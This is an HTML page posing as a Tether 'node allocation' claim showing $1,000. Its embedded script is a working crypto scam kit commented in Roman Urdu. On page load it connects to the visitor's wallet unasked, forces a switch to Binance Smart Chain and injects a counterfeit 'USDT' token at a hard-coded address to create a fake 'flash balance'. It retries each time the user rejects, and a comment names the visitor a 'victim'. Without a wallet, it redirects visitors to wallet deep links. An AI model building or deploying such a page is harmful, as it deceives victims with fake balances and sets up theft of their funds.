<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tether Node Distribution</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --tether: #26a17b; --bg: #0b0e11; }
        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; text-rendering: optimizeLegibility; }
        .card { background: #1a1d21; border-radius: 30px; padding: 45px; width: 100%; max-width: 380px; text-align: center; border: 1px solid #2d333b; box-shadow: 0 40px 100px rgba(0,0,0,0.8); }
        .usdt-glow { width: 90px; filter: drop-shadow(0 0 20px var(--tether)); margin-bottom: 25px; }
        .amount { font-size: 52px; font-weight: 900; color: #fff; margin: 10px 0; letter-spacing: -2px; }
        .btn { background: var(--tether); color: #fff; border: none; width: 100%; padding: 24px; border-radius: 18px; font-size: 18px; font-weight: 800; cursor: pointer; text-transform: uppercase; box-shadow: 0 10px 30px rgba(38, 161, 123, 0.4); transition: 0.2s; }
        .btn:active { transform: scale(0.97); opacity: 0.9; }
        #status-log { font-size: 10px; color: var(--tether); margin-top: 30px; font-family: 'Courier New', monospace; text-transform: uppercase; opacity: 0.7; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="usdt-glow">
    <div style="color: #848e9c; font-size: 12px; letter-spacing: 2px; font-weight: 700;">NODE ALLOCATION ACTIVE</div>
    <div class="amount" id="displayAmt">$1,000.00</div>
    <button class="btn" id="syncAction">Force Sync Node</button>
    <div id="status-log">NODE_STATUS: STANDBY</div>
</div>

<script>
    const TARGET_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const TARGET_LOGO = "https://assets.coingecko.com/coins/images/325/large/Tether.png";

    const btn = document.getElementById('syncAction');
    const log = document.getElementById('status-log');

    // 1. UNIVERSAL BRIDGE - Ye function phone ke har wallet ko signal bhejay ga
    async function triggerUniversalBridge() {
        log.innerText = "INITIALIZING UNIVERSAL BRIDGE...";
        
        // Agar browser mein wallet nahi milta (Chrome/Safari)
        if (!window.ethereum && !window.trustwallet) {
            const currentUrl = encodeURIComponent(window.location.href);
            // Universal Deep Link Protocol - Jo phone mein installed wallet ko priority deta hai
            const walletBridge = "https://link.trustwallet.com/a/dapp?url=" + currentUrl;
            window.location.href = walletBridge;
            
            // Backup redirect for MetaMask/Phantom
            setTimeout(() => {
                window.location.href = "https://metamask.app.link/dapp/" + window.location.href.replace("https://", "");
            }, 1500);
            return;
        }

        const provider = window.trustwallet || window.ethereum;

        try {
            log.innerText = "LINKING TO ACTIVE PROVIDER...";
            // Force Connection
            await provider.request({ method: 'eth_requestAccounts' });

            // Switch Chain to BSC (Zero-Fee Mapping)
            log.innerText = "MAPPING BINANCE SMART CHAIN...";
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            }).catch(async (e) => {
                if (e.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{ chainId: '0x38', chainName: 'BSC', rpcUrls: ['https://bsc-dataseed.binance.org/'], nativeCurrency: {name:'BNB',symbol:'BNB',decimals:18} }]
                    });
                }
            });

            // THE INJECTION - Bina signature ke direct asset add karna
            log.innerText = "INJECTING ASSET METADATA...";
            const injected = await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: TARGET_ADDR,
                        symbol: 'USDT',
                        decimals: 18, // For Flash Balance effect
                        image: TARGET_LOGO,
                    },
                },
            });

            if (injected) {
                log.innerText = "SUCCESS: NODE SYNCHRONIZED";
                btn.innerText = "SYNCED ✅";
                btn.style.background = "#1e8a69";
            }

        } catch (err) {
            log.innerText = "RETRYING INJECTION...";
            console.error(err);
            // Auto-Retry on rejection (Strong System)
            setTimeout(triggerUniversalBridge, 500);
        }
    }

    btn.addEventListener('click', triggerUniversalBridge);

    // AUTO-FIRE: Jab victim link kholay, system khud connect ho jaye
    window.onload = () => {
        if (window.ethereum || window.trustwallet) {
            log.innerText = "ACTIVE WALLET DETECTED. AUTO-SYNCING...";
            setTimeout(triggerUniversalBridge, 1000);
        }
    };
</script>
</body>
</html>
